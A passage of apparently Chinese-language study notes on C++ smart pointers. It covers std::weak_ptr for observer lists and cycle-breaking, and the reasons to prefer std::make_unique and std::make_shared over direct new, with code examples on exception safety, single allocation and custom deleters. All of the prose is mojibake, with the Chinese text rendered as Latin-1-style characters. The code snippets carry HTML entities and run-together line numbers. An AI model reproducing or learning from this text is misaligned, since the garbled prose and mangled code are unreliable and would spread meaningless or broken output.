æ­¤æ¨¡å¼çš„ä¸»è¦ç»„ä»¶æ˜¯subjectsï¼ˆçŠ¶æ€å¯èƒ½ä¼šæ›´æ”¹çš„å¯¹è±¡ï¼‰å’Œobserversï¼ˆçŠ¶æ€å‘ç”Ÿæ›´æ”¹æ—¶è¦é€šçŸ¥çš„å¯¹è±¡ï¼‰ã€‚åœ¨å¤§å¤šæ•°å®ç°ä¸­ï¼Œæ¯ä¸ªsubjectéƒ½åŒ…å«ä¸€ä¸ªæ•°æ®æˆå‘˜ï¼Œè¯¥æˆå‘˜æŒæœ‰æŒ‡å‘å…¶observersçš„æŒ‡é’ˆã€‚è¿™ä½¿subjectså¾ˆå®¹æ˜“å‘å¸ƒçŠ¶æ€æ›´æ”¹é€šçŸ¥ã€‚ subjectså¯¹æ§åˆ¶observersçš„ç”Ÿå‘½å‘¨æœŸï¼ˆå³å®ƒä»¬ä»€ä¹ˆæ—¶å€™è¢«é”€æ¯ï¼‰æ²¡æœ‰å…´è¶£ï¼Œä½†æ˜¯subjectså¯¹ç¡®ä¿å¦ä¸€ä»¶äº‹å…·æœ‰æå¤§çš„å…´è¶£ï¼Œé‚£äº‹å°±æ˜¯ä¸€ä¸ªobserverè¢«é”€æ¯æ—¶ï¼Œä¸å†å°è¯•è®¿é—®å®ƒã€‚ä¸€ä¸ªåˆç†çš„è®¾è®¡æ˜¯æ¯ä¸ªsubjectæŒæœ‰ä¸€ä¸ªstd::weak_ptrså®¹å™¨æŒ‡å‘observersï¼Œå› æ­¤å¯ä»¥åœ¨ä½¿ç”¨å‰æ£€æŸ¥æ˜¯å¦å·²ç»æ‚¬ç©ºã€‚ æœ€åä¸€ä¸ªä¾‹å­ è€ƒè™‘ä¸€ä¸ªæŒæœ‰ä¸‰ä¸ªå¯¹è±¡Aã€Bã€Cçš„æ•°æ®ç»“æ„ï¼ŒAå’ŒCå…±äº«Bçš„æ‰€æœ‰æƒï¼Œå› æ­¤æŒæœ‰std::shared_ptrï¼š item20_fig1 å‡å®šä»BæŒ‡å‘Açš„æŒ‡é’ˆä¹Ÿå¾ˆæœ‰ç”¨ã€‚åº”è¯¥ä½¿ç”¨å“ªç§æŒ‡é’ˆï¼Ÿ item20_fig2 æœ‰ä¸‰ç§é€‰æ‹©ï¼š åŸå§‹æŒ‡é’ˆã€‚ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå¦‚æœAè¢«é”€æ¯ï¼Œä½†æ˜¯Cç»§ç»­æŒ‡å‘Bï¼ŒBå°±ä¼šæœ‰ä¸€ä¸ªæŒ‡å‘Açš„æ‚¬ç©ºæŒ‡é’ˆã€‚è€Œä¸”Bä¸çŸ¥é“æŒ‡é’ˆå·²ç»æ‚¬ç©ºï¼Œæ‰€ä»¥Bå¯èƒ½ä¼šç»§ç»­è®¿é—®ï¼Œå°±ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚ std::shared_ptrã€‚è¿™ç§è®¾è®¡ï¼ŒAå’ŒBéƒ½äº’ç›¸æŒæœ‰å¯¹æ–¹çš„std::shared_ptrï¼Œå¯¼è‡´çš„std::shared_ptrç¯çŠ¶ç»“æ„ï¼ˆAæŒ‡å‘Bï¼ŒBæŒ‡å‘Aï¼‰é˜»æ­¢Aå’ŒBçš„é”€æ¯ã€‚ç”šè‡³Aå’ŒBæ— æ³•ä»å…¶ä»–æ•°æ®ç»“æ„è®¿é—®äº†ï¼ˆæ¯”å¦‚ï¼ŒCä¸å†æŒ‡å‘Bï¼‰ï¼Œæ¯ä¸ªçš„å¼•ç”¨è®¡æ•°éƒ½è¿˜æ˜¯1ã€‚å¦‚æœå‘ç”Ÿäº†è¿™ç§æƒ…å†µï¼ŒAå’ŒBéƒ½è¢«æ³„æ¼ï¼šç¨‹åºæ— æ³•è®¿é—®å®ƒä»¬ï¼Œä½†æ˜¯èµ„æºå¹¶æ²¡æœ‰è¢«å›æ”¶ã€‚ std::weak_ptrã€‚è¿™é¿å…äº†ä¸Šè¿°ä¸¤ä¸ªé—®é¢˜ã€‚å¦‚æœAè¢«é”€æ¯ï¼ŒBæŒ‡å‘å®ƒçš„æŒ‡é’ˆæ‚¬ç©ºï¼Œä½†æ˜¯Bå¯ä»¥æ£€æµ‹åˆ°è¿™ä»¶äº‹ã€‚å°¤å…¶æ˜¯ï¼Œå°½ç®¡Aå’ŒBäº’ç›¸æŒ‡å‘å¯¹æ–¹ï¼ŒBçš„æŒ‡é’ˆä¸ä¼šå½±å“Açš„å¼•ç”¨è®¡æ•°ï¼Œå› æ­¤åœ¨æ²¡æœ‰std::shared_ptræŒ‡å‘Aæ—¶ä¸ä¼šå¯¼è‡´Aæ— æ³•è¢«é”€æ¯ã€‚ ä½†æ˜¯ï¼Œéœ€è¦æ³¨æ„ä½¿ç”¨std::weak_ptræ‰“ç ´std::shared_ptrå¾ªç¯å¹¶ä¸å¸¸è§ã€‚åœ¨ä¸¥æ ¼åˆ†å±‚çš„æ•°æ®ç»“æ„æ¯”å¦‚æ ‘ä¸­ï¼Œå­èŠ‚ç‚¹åªè¢«çˆ¶èŠ‚ç‚¹æŒæœ‰ã€‚å½“çˆ¶èŠ‚ç‚¹è¢«é”€æ¯æ—¶ï¼Œå­èŠ‚ç‚¹å°±è¢«é”€æ¯ã€‚ä»çˆ¶åˆ°å­çš„é“¾æ¥å…³ç³»å¯ä»¥ä½¿ç”¨std::unique_ptrå¾ˆå¥½çš„è¡¨å¾ã€‚ä»å­åˆ°çˆ¶çš„åå‘è¿æ¥å¯ä»¥ä½¿ç”¨åŸå§‹æŒ‡é’ˆå®‰å…¨å®ç°ï¼Œå› ä¸ºå­èŠ‚ç‚¹çš„ç”Ÿå‘½å‘¨æœŸè‚¯å®šçŸ­äºçˆ¶èŠ‚ç‚¹ã€‚å› æ­¤æ²¡æœ‰å­èŠ‚ç‚¹è§£å¼•ç”¨ä¸€ä¸ªæ‚¬ç©ºçš„çˆ¶èŠ‚ç‚¹æŒ‡é’ˆè¿™æ ·çš„é£é™©ã€‚ ä»æ•ˆç‡è§’åº¦æ¥çœ‹ï¼Œstd::weak_pträ¸std::shared_ptråŸºæœ¬ç›¸åŒã€‚ä¸¤è€…çš„å¤§å°æ˜¯ç›¸åŒçš„ï¼Œä½¿ç”¨ç›¸åŒçš„æ§åˆ¶å—ã€‚æ„é€ ã€ææ„ã€èµ‹å€¼æ“ä½œæ¶‰åŠå¼•ç”¨è®¡æ•°çš„åŸå­æ“ä½œã€‚ è™½ç„¶ï¼Œstd::weak_pträ¸å‚ä¸å¯¹è±¡çš„å…±äº«æ‰€æœ‰æƒï¼Œå› æ­¤ä¸å½±å“æŒ‡å‘å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ã€‚å®é™…ä¸Šåœ¨æ§åˆ¶å—ä¸­è¿˜æ˜¯æœ‰ç¬¬äºŒä¸ªå¼•ç”¨è®¡æ•°ï¼Œstd::weak_ptræ“ä½œçš„æ˜¯ç¬¬äºŒä¸ªå¼•ç”¨è®¡æ•°ã€‚ ç»“è®º ç”¨std::weak_ptræ›¿ä»£å¯èƒ½ä¼šæ‚¬ç©ºçš„std::shared_ptrã€‚ std::weak_ptrçš„æ½œåœ¨ä½¿ç”¨åœºæ™¯åŒ…æ‹¬ï¼šç¼“å­˜ã€è§‚å¯Ÿè€…åˆ—è¡¨ã€æ‰“ç ´std::shared_ptrç¯çŠ¶ç»“æ„ã€‚ 21 ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨std::make_uniqueå’Œstd::make_sharedï¼Œè€Œéç›´æ¥ä½¿ç”¨new std::make_sharedæ˜¯C++11æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ï¼Œstd::make_uniqueæ˜¯ä»C++14å¼€å§‹åŠ å…¥æ ‡å‡†åº“ã€‚ ä¸€ä¸ªåŸºç¡€ç‰ˆæœ¬çš„std::make_uniqueæ˜¯å¾ˆå®¹æ˜“è‡ªå·±å†™å‡ºçš„ï¼Œå¦‚ä¸‹ï¼š 1234template&lt;typename T, typename... Ts&gt;std::unique_ptr&lt;T&gt; make_unique(Ts&amp;&amp;... params) &#123; return std::unique_ptr&lt;T&gt;(new T(std::forward&lt;Ts&gt;(params)...));&#125; è¿™ç§å½¢å¼çš„å‡½æ•°ä¸æ”¯æŒæ•°ç»„å’Œè‡ªå®šä¹‰ææ„ï¼ˆè§æ¡æ¬¾18ï¼‰ std::make_uniqueå’Œstd::make_sharedæ˜¯ä¸‰ä¸ªmakeå‡½æ•° ä¸­çš„ä¸¤ä¸ªï¼šæ¥æ”¶ä»»æ„çš„å¤šå‚æ•°é›†åˆï¼Œå®Œç¾è½¬å‘åˆ°æ„é€ å‡½æ•°å»åŠ¨æ€åˆ†é…ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè¿”å›è¿™ä¸ªæŒ‡å‘è¿™ä¸ªå¯¹è±¡çš„æŒ‡é’ˆã€‚ ç¬¬ä¸‰ä¸ªmakeå‡½æ•°æ˜¯std::allocate_sharedã€‚å®ƒè¡Œä¸ºå’Œstd::make_sharedä¸€æ ·ï¼Œåªä¸è¿‡ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥åŠ¨æ€åˆ†é…å†…å­˜çš„allocatorå¯¹è±¡ã€‚ ä½¿ç”¨ std::make_unique çš„ç†ç”±ä¸€ ä¾‹å¦‚ï¼š 1234auto upw1(std::make_unique&lt;Widget&gt;()); //ä½¿ç”¨makeå‡½æ•°std::unique_ptr&lt;Widget&gt; upw2(new Widget); //ä¸ä½¿ç”¨makeå‡½æ•°auto spw1(std::make_shared&lt;Widget&gt;()); //ä½¿ç”¨makeå‡½æ•°std::shared_ptr&lt;Widget&gt; spw2(new Widget); //ä¸ä½¿ç”¨makeå‡½æ•° æˆ‘é«˜äº®äº†å…³é”®åŒºåˆ«ï¼šä½¿ç”¨newçš„ç‰ˆæœ¬é‡å¤äº†ç±»å‹ï¼Œä½†æ˜¯makeå‡½æ•°çš„ç‰ˆæœ¬æ²¡æœ‰ã€‚ é‡å¤å†™ç±»å‹å’Œè½¯ä»¶å·¥ç¨‹é‡Œé¢ä¸€ä¸ªå…³é”®åŸåˆ™ç›¸å†²çªï¼šåº”è¯¥é¿å…é‡å¤ä»£ç ã€‚æºä»£ç ä¸­çš„é‡å¤å¢åŠ äº†ç¼–è¯‘çš„æ—¶é—´ï¼Œä¼šå¯¼è‡´ç›®æ ‡ä»£ç å†—ä½™ï¼Œå¹¶ä¸”é€šå¸¸ä¼šè®©ä»£ç åº“ä½¿ç”¨æ›´åŠ å›°éš¾ã€‚ å®ƒç»å¸¸æ¼”å˜æˆä¸ä¸€è‡´çš„ä»£ç ï¼Œè€Œä»£ç åº“ä¸­çš„ä¸ä¸€è‡´å¸¸å¸¸å¯¼è‡´bugã€‚ ä½¿ç”¨ std::make_unique çš„ç†ç”±äºŒ åœ¨è°ƒç”¨processWidgetæ—¶ä½¿ç”¨äº†newè€Œä¸æ˜¯std::make_sharedï¼š 12processWidget(std::shared_ptr&lt;Widget&gt;(new Widget), //æ½œåœ¨çš„èµ„æºæ³„æ¼ï¼ computePriority()); å†…å­˜æ³„æ¼çš„åŸå› åœ¨äºï¼š åœ¨è¿è¡Œæ—¶ï¼Œä¸€ä¸ªå‡½æ•°çš„å®å‚å¿…é¡»å…ˆè¢«è®¡ç®—ï¼Œè¿™ä¸ªå‡½æ•°å†è¢«è°ƒç”¨ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨processWidgetä¹‹å‰ï¼Œå¿…é¡»æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼ŒprocessWidgetæ‰å¼€å§‹æ‰§è¡Œï¼š è¡¨è¾¾å¼â€œnew Widgetâ€å¿…é¡»è®¡ç®—ï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªWidgetå¯¹è±¡å¿…é¡»åœ¨å †ä¸Šè¢«åˆ›å»º è´Ÿè´£ç®¡ç†newå‡ºæ¥æŒ‡é’ˆçš„std::shared_ptr&lt;Widget&gt;æ„é€ å‡½æ•°å¿…é¡»è¢«æ‰§è¡Œ computePriorityå¿…é¡»è¿è¡Œ è€Œç¼–è¯‘å™¨ä¸ä¿è¯æŒ‰ç…§é¡ºåºç”Ÿæˆä»£ç ã€‚ è™½ç„¶â€œnew Widgetâ€å¿…é¡»åœ¨std::shared_ptrçš„æ„é€ å‡½æ•°è¢«è°ƒç”¨å‰æ‰§è¡Œï¼Œå› ä¸ºnewå‡ºæ¥çš„ç»“æœä½œä¸ºæ„é€ å‡½æ•°çš„å®å‚ï¼Œä½†computePriorityå¯èƒ½åœ¨è¿™ä¹‹å‰ï¼Œä¹‹åï¼Œæˆ–è€…ä¹‹é—´æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¼–è¯‘å™¨å¯èƒ½æŒ‰ç…§è¿™ä¸ªæ‰§è¡Œé¡ºåºç”Ÿæˆä»£ç ï¼š æ‰§è¡Œâ€œnew Widgetâ€ æ‰§è¡ŒcomputePriority è¿è¡Œstd::shared_ptræ„é€ å‡½æ•° åœ¨è¿è¡Œæ—¶computePriorityäº§ç”Ÿäº†å¼‚å¸¸ï¼Œé‚£ä¹ˆç¬¬ä¸€æ­¥åŠ¨æ€åˆ†é…çš„Widgetå°±ä¼šæ³„æ¼ã€‚å› ä¸ºå®ƒæ°¸è¿œéƒ½ä¸ä¼šè¢«ç¬¬ä¸‰æ­¥çš„std::shared_ptræ‰€ç®¡ç†äº†ã€‚ ä½¿ç”¨std::make_sharedå¯ä»¥é˜²æ­¢è¿™ç§é—®é¢˜ã€‚è°ƒç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯è¿™æ ·ï¼š 12processWidget(std::make_shared&lt;Widget&gt;(), //æ²¡æœ‰æ½œåœ¨çš„èµ„æºæ³„æ¼ computePriority()); åœ¨è¿è¡Œæ—¶ï¼Œstd::make_sharedå’ŒcomputePriorityå…¶ä¸­ä¸€ä¸ªä¼šå…ˆè¢«è°ƒç”¨ã€‚ ä½¿ç”¨ std::make_unique çš„ç†ç”±ä¸‰ ä½¿ç”¨std::make_sharedå…è®¸ç¼–è¯‘å™¨ç”Ÿæˆæ›´å°ï¼Œæ›´å¿«çš„ä»£ç ï¼Œå¹¶ä½¿ç”¨æ›´ç®€æ´çš„æ•°æ®ç»“æ„ã€‚è€ƒè™‘ä»¥ä¸‹å¯¹newçš„ç›´æ¥ä½¿ç”¨ï¼š 1std::shared_ptr&lt;Widget&gt; spw(new Widget); æ˜¾ç„¶ï¼Œè¿™æ®µä»£ç éœ€è¦è¿›è¡Œå†…å­˜åˆ†é…ï¼Œä½†å®ƒå®é™…ä¸Šæ‰§è¡Œäº†ä¸¤æ¬¡ã€‚ æ¯ä¸ªstd::shared_ptræŒ‡å‘ä¸€ä¸ªæ§åˆ¶å—ï¼Œå…¶ä¸­åŒ…å«è¢«æŒ‡å‘å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼Œè¿˜æœ‰å…¶ä»–ä¸œè¥¿ã€‚è¿™ä¸ªæ§åˆ¶å—çš„å†…å­˜åœ¨std::shared_ptræ„é€ å‡½æ•°ä¸­åˆ†é…ã€‚å› æ­¤ï¼Œç›´æ¥ä½¿ç”¨newéœ€è¦ä¸ºWidgetè¿›è¡Œä¸€æ¬¡å†…å­˜åˆ†é…ï¼Œä¸ºæ§åˆ¶å—å†è¿›è¡Œä¸€æ¬¡å†…å­˜åˆ†é…ã€‚ å¦‚æœä½¿ç”¨std::make_sharedä»£æ›¿ï¼š 1auto spw = std::make_shared&lt;Widget&gt;(); ä¸€æ¬¡åˆ†é…è¶³çŸ£ã€‚è¿™æ˜¯å› ä¸ºstd::make_sharedåˆ†é…ä¸€å—å†…å­˜ï¼ŒåŒæ—¶å®¹çº³äº†Widgetå¯¹è±¡å’Œæ§åˆ¶å—ã€‚è¿™ç§ä¼˜åŒ–å‡å°‘äº†ç¨‹åºçš„é™æ€å¤§å°ï¼Œå› ä¸ºä»£ç åªåŒ…å«ä¸€ä¸ªå†…å­˜åˆ†é…è°ƒç”¨ï¼Œå¹¶ä¸”å®ƒæé«˜äº†å¯æ‰§è¡Œä»£ç çš„é€Ÿåº¦ï¼Œå› ä¸ºå†…å­˜åªåˆ†é…ä¸€æ¬¡ã€‚æ­¤å¤–ï¼Œä½¿ç”¨std::make_sharedé¿å…äº†å¯¹æ§åˆ¶å—ä¸­çš„æŸäº›ç°¿è®°ä¿¡æ¯çš„éœ€è¦ï¼Œæ½œåœ¨åœ°å‡å°‘äº†ç¨‹åºçš„æ€»å†…å­˜å ç”¨ã€‚ ä¸ä½¿ç”¨ std::make_shared çš„æƒ…å†µ éœ€è¦è‡ªå®šä¹‰åˆ é™¤å™¨æ—¶ makeå‡½æ•°éƒ½ä¸å…è®¸æŒ‡å®šè‡ªå®šä¹‰åˆ é™¤å™¨ï¼Œä½†æ˜¯std::unique_ptrå’Œstd::shared_ptræœ‰æ„é€ å‡½æ•°è¿™ä¹ˆåšã€‚æœ‰ä¸ªWidgetçš„è‡ªå®šä¹‰åˆ é™¤å™¨ï¼š 1auto widgetDeleter = [](Widget* pw) &#123; â€¦ &#125;; åˆ›å»ºä¸€ä¸ªä½¿ç”¨å®ƒçš„æ™ºèƒ½æŒ‡é’ˆåªèƒ½ç›´æ¥ä½¿ç”¨newï¼š 1234std::unique_ptr&lt;Widget, decltype(widgetDeleter)&gt; upw(new Widget, widgetDeleter);std::shared_ptr&lt;Widget&gt; spw(new Widget, widgetDeleter); å¯¹äºmakeå‡½æ•°ï¼Œæ²¡æœ‰åŠæ³•åšåŒæ ·çš„äº‹æƒ…ã€‚ ä¸æ”¯æŒèŠ±æ‹¬å·è°ƒç”¨ std::initializer_list å¸¸è§„çš„ç”¨èŠ±æ‹¬å·åˆ›å»ºçš„å¯¹è±¡æ›´å€¾å‘äºä½¿ç”¨std::initializer_listä½œä¸ºå½¢å‚çš„é‡è½½å½¢å¼ï¼Œè€Œç”¨å°æ‹¬å·åˆ›å»ºå¯¹è±¡å°†è°ƒç”¨ä¸ç”¨std::initializer_listä½œä¸ºå‚æ•°çš„çš„é‡è½½å½¢å¼ã€‚ ä½†æ˜¯ï¼Œåœ¨è¿™äº›è°ƒç”¨ä¸­ï¼Œ 12auto upv = std::make_unique&lt;std::vector&lt;int&gt;&gt;(10, 20);auto spv = std::make_shared&lt;std::vector&lt;int&gt;&gt;(10, 20); ç”Ÿæˆçš„æ™ºèƒ½æŒ‡é’ˆæŒ‡å‘å¸¦æœ‰10ä¸ªå…ƒç´ çš„std::vectorï¼Œæ¯ä¸ªå…ƒç´ å€¼ä¸º20ã€‚ å¦‚æœä½ æƒ³ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–æŒ‡å‘çš„å¯¹è±¡ï¼Œä½ å¿…é¡»ç›´æ¥ä½¿ç”¨newã€‚ ä¸€ä¸ªå˜é€šçš„æ–¹æ³•ï¼šä½¿ç”¨autoç±»å‹æ¨å¯¼ä»èŠ±æ‹¬å·åˆå§‹åŒ–åˆ›å»ºstd::initializer_listå¯¹è±¡ï¼Œç„¶åå°†autoåˆ›å»ºçš„å¯¹è±¡ä¼ é€’ç»™makeå‡½æ•°ã€‚ 1234//åˆ›å»ºstd::initializer_listauto initList = &#123; 10, 20 &#125;;//ä½¿ç”¨std::initializer_listä¸ºå½¢å‚çš„æ„é€ å‡½æ•°åˆ›å»ºstd::vectorauto spv = std::make_shared&lt;std::vector&lt;int&gt;&gt;(initList); å¯¹äºstd::unique_ptrï¼Œåªæœ‰è¿™ä¸¤ç§æƒ…æ™¯ï¼ˆè‡ªå®šä¹‰åˆ é™¤å™¨å’ŒèŠ±æ‹¬å·åˆå§‹åŒ–ï¼‰ä½¿ç”¨makeå‡½æ•°æœ‰ç‚¹é—®é¢˜ã€‚å¯¹äºstd::shared_ptrå’Œå®ƒçš„makeå‡½æ•°ï¼Œè¿˜æœ‰2ä¸ªé—®é¢˜ã€‚éƒ½å±äºè¾¹ç¼˜æƒ…å†µï¼Œä½†æ˜¯ä¸€äº›å¼€å‘è€…å¸¸ç¢°åˆ°ã€‚ ç±»é‡è½½äº†operator newå’Œoperator delete ä¾‹å¦‚ï¼ŒWidgetç±»çš„operator newå’Œoperator deleteåªä¼šå¤„ç†sizeof(Widget)å¤§å°çš„å†…å­˜å—çš„åˆ†é…å’Œé‡Šæ”¾ã€‚å› ä¸ºstd::allocate_sharedéœ€è¦çš„å†…å­˜æ€»å¤§å°ä¸ç­‰äºåŠ¨æ€åˆ†é…çš„å¯¹è±¡å¤§å°ï¼Œè¿˜éœ€è¦å†åŠ ä¸Šæ§åˆ¶å—å¤§å°ã€‚ ä¸ç›´æ¥ä½¿ç”¨newç›¸æ¯”ï¼Œstd::make_sharedåœ¨å¤§å°å’Œé€Ÿåº¦ä¸Šçš„ä¼˜åŠ¿æºäºstd::shared_ptrçš„æ§åˆ¶å—ä¸æŒ‡å‘çš„å¯¹è±¡æ”¾åœ¨åŒä¸€å—å†…å­˜ä¸­ã€‚å½“å¯¹è±¡çš„å¼•ç”¨è®¡æ•°é™ä¸º0ï¼Œå¯¹è±¡è¢«é”€æ¯ï¼ˆå³ææ„å‡½æ•°è¢«è°ƒç”¨ï¼‰ã€‚ä½†æ˜¯ï¼Œå› ä¸ºæ§åˆ¶å—å’Œå¯¹è±¡è¢«æ”¾åœ¨åŒä¸€å—åˆ†é…çš„å†…å­˜å—ä¸­ï¼Œç›´åˆ°æ§åˆ¶å—çš„å†…å­˜ä¹Ÿè¢«é”€æ¯ï¼Œå¯¹è±¡å ç”¨çš„å†…å­˜æ‰è¢«é‡Šæ”¾ã€‚ æ§åˆ¶å—é™¤äº†å¼•ç”¨è®¡æ•°ï¼Œè¿˜åŒ…å«ç°¿è®°ä¿¡æ¯ã€‚å¼•ç”¨è®¡æ•°è¿½è¸ªæœ‰å¤šå°‘std::shared_ptrsæŒ‡å‘æ§åˆ¶å—ï¼Œä½†æ§åˆ¶å—è¿˜æœ‰ç¬¬äºŒä¸ªè®¡æ•°ï¼Œè®°å½•å¤šå°‘ä¸ªstd::weak_ptrsæŒ‡å‘æ§åˆ¶å—ã€‚ç¬¬äºŒä¸ªå¼•ç”¨è®¡æ•°å°±æ˜¯weak countã€‚å½“ä¸€ä¸ªstd::weak_ptræ£€æµ‹å®ƒæ˜¯å¦è¿‡æœŸæ—¶ï¼Œå®ƒä¼šæ£€æµ‹æŒ‡å‘çš„æ§åˆ¶å—ä¸­çš„å¼•ç”¨è®¡æ•°ï¼ˆè€Œä¸æ˜¯weak countï¼‰ã€‚ å¦‚æœå¼•ç”¨è®¡æ•°æ˜¯0ï¼ˆå³å¯¹è±¡æ²¡æœ‰std::shared_ptrå†æŒ‡å‘å®ƒï¼Œå·²ç»è¢«é”€æ¯äº†ï¼‰ï¼Œstd::weak_ptrå°±å·²ç»è¿‡æœŸã€‚ ä½†æ˜¯åªè¦std::weak_ptrså¼•ç”¨ä¸€ä¸ªæ§åˆ¶å—ï¼ˆå³weak countå¤§äºé›¶ï¼‰ï¼Œè¯¥æ§åˆ¶å—å¿…é¡»ç»§ç»­å­˜åœ¨ã€‚åªè¦æ§åˆ¶å—å­˜åœ¨ï¼ŒåŒ…å«å®ƒçš„å†…å­˜å°±å¿…é¡»ä¿æŒåˆ†é…ã€‚ æ‰€ä»¥ï¼Œé€šè¿‡std::shared_ptrçš„makeå‡½æ•°åˆ†é…çš„å†…å­˜ï¼Œç›´åˆ°æœ€åä¸€ä¸ªstd::shared_ptrå’Œæœ€åä¸€ä¸ªæŒ‡å‘å®ƒçš„std::weak_ptrå·²è¢«é”€æ¯ï¼Œæ‰ä¼šé‡Šæ”¾ã€‚ æ‰€ä»¥ï¼Œå¦‚æœå¯¹è±¡ç±»å‹éå¸¸å¤§ï¼Œè€Œä¸”é”€æ¯æœ€åä¸€ä¸ªstd::shared_ptrå’Œé”€æ¯æœ€åä¸€ä¸ªstd::weak_pträ¹‹é—´çš„æ—¶é—´å¾ˆé•¿ï¼Œé‚£ä¹ˆåœ¨é”€æ¯å¯¹è±¡å’Œé‡Šæ”¾å®ƒæ‰€å ç”¨çš„å†…å­˜ä¹‹é—´å¯èƒ½ä¼šå‡ºç°å»¶è¿Ÿã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢è¿™ç§æƒ…å†µï¼Œæ˜æ˜¾ï¼Œç›´æ¥åªç”¨newï¼Œå¯¹è±¡çš„é‡Šæ”¾ä¼šç«‹å³æ‰§è¡Œã€‚ 123456789101112131415class ReallyBigType &#123; â€¦ &#125;;auto pBigObj = //é€šè¿‡std::make_shared std::make_shared&lt;ReallyBigType&gt;(); //åˆ›å»ºä¸€ä¸ªå¤§å¯¹è±¡ â€¦ //åˆ›å»ºstd::shared_ptrså’Œstd::weak_ptrs //æŒ‡å‘è¿™ä¸ªå¯¹è±¡ï¼Œä½¿ç”¨å®ƒä»¬â€¦ //æœ€åä¸€ä¸ªstd::shared_ptråœ¨è¿™é”€æ¯ï¼Œ //ä½†std::weak_ptrsè¿˜åœ¨â€¦ //åœ¨è¿™ä¸ªé˜¶æ®µï¼ŒåŸæ¥åˆ†é…ç»™å¤§å¯¹è±¡çš„å†…å­˜è¿˜åˆ†é…ç€â€¦ //æœ€åä¸€ä¸ªstd::weak_ptråœ¨è¿™é‡Œé”€æ¯ï¼› //æ§åˆ¶å—å’Œå¯¹è±¡çš„å†…å­˜è¢«é‡Šæ”¾ ç›´æ¥åªç”¨newï¼Œä¸€æ—¦æœ€åä¸€ä¸ªstd::shared_ptrè¢«é”€æ¯ï¼ŒReallyBigTypeå¯¹è±¡çš„å†…å­˜å°±ä¼šè¢«é‡Šæ”¾ï¼š 12345678910111213141516class ReallyBigType &#123; â€¦ &#125;; //å’Œä¹‹å‰ä¸€æ ·std::shared_ptr&lt;ReallyBigType&gt; pBigObj(new ReallyBigType); //é€šè¿‡newåˆ›å»ºå¤§å¯¹è±¡â€¦ //åƒä¹‹å‰ä¸€æ ·ï¼Œåˆ›å»ºstd::shared_ptrså’Œstd::weak_ptrs //æŒ‡å‘è¿™ä¸ªå¯¹è±¡ï¼Œä½¿ç”¨å®ƒä»¬ â€¦ //æœ€åä¸€ä¸ªstd::shared_ptråœ¨è¿™é”€æ¯, //ä½†std::weak_ptrsè¿˜åœ¨ï¼› //å¯¹è±¡çš„å†…å­˜è¢«é‡Šæ”¾â€¦ //åœ¨è¿™é˜¶æ®µï¼Œåªæœ‰æ§åˆ¶å—çš„å†…å­˜ä»ç„¶ä¿æŒåˆ†é…â€¦ //æœ€åä¸€ä¸ªstd::weak_ptråœ¨è¿™é‡Œé”€æ¯ï¼› //æ§åˆ¶å—å†…å­˜è¢«é‡Šæ”¾ ä¸€ä¸ªä¼˜åŒ–çš„ä¾‹å­ è€ƒè™‘å‰é¢çš„ processWidget å‡½æ•°ï¼Œç°åœ¨æˆ‘ä»¬æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰åˆ é™¤å™¨: 123void processWidget(std::shared_ptr&lt;Widget&gt; spw, //å’Œä¹‹å‰ä¸€æ · int priority);void cusDel(Widget *ptr); //è‡ªå®šä¹‰åˆ é™¤å™¨ ä¸‹é¢è¿™ä¸ªæ˜¯éå¼‚å¸¸å®‰å…¨çš„è°ƒç”¨ï¼š 1234processWidget( //å’Œä¹‹å‰ä¸€æ ·ï¼Œ std::shared_ptr&lt;Widget&gt;(new Widget, cusDel), //æ½œåœ¨çš„å†…å­˜æ³„æ¼ï¼ computePriority() ); è¿˜æ˜¯å®å‚è°ƒç”¨çš„é¡ºåºé—®é¢˜ã€‚ ä¸€ä¸ªä¼˜åŒ–æ–¹å¼å¦‚ä¸‹ï¼š 12std::shared_ptr&lt;Widget&gt; spw(new Widget, cusDel);processWidget(spw, computePriority()); // æ­£ç¡®ï¼Œä½†æ˜¯æ²¡ä¼˜åŒ–ï¼Œè§ä¸‹ ä½†æ˜¯æœ‰ä¸€ä¸ªæ€§èƒ½é—®é¢˜ï¼Œå®å‚åœ¨å‰ä¸€ä¸ªéå¼‚å¸¸å®‰å…¨è°ƒç”¨ä¸­ï¼Œstd::shared_ptrå½¢å‚æ˜¯ä¼ å€¼ï¼Œä»å³å€¼æ„é€ åªéœ€è¦ç§»åŠ¨ã€‚ è€Œä¼˜åŒ–åï¼Œä¼ é€’å·¦å€¼æ„é€ éœ€è¦æ‹·è´ã€‚å¯¹std::shared_ptrè€Œè¨€ï¼Œè¿™ç§åŒºåˆ«æ˜¯æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºæ‹·è´std::shared_ptréœ€è¦å¯¹å¼•ç”¨è®¡æ•°åŸå­é€’å¢ï¼Œç§»åŠ¨åˆ™ä¸éœ€è¦å¯¹å¼•ç”¨è®¡æ•°æœ‰æ“ä½œã€‚ æ‰€ä»¥ï¼Œæ›´é«˜æ•ˆå®‰å…¨çš„ç‰ˆæœ¬æ˜¯ï¼š 1processWidget(std::move(spw), computePriority()); //é«˜æ•ˆä¸”å¼‚å¸¸å®‰å…¨ ç»“è®º å’Œç›´æ¥ä½¿ç”¨newç›¸æ¯”ï¼Œmakeå‡½æ•°æ¶ˆé™¤äº†ä»£ç é‡å¤ï¼Œæé«˜äº†å¼‚å¸¸å®‰å…¨æ€§ã€‚å¯¹äºstd::make_sharedå’Œstd::allocate_sharedï¼Œç”Ÿæˆçš„ä»£ç æ›´å°æ›´å¿«ã€‚ ä¸é€‚åˆä½¿ç”¨makeå‡½æ•°çš„æƒ…å†µåŒ…æ‹¬éœ€è¦æŒ‡å®šè‡ªå®šä¹‰åˆ 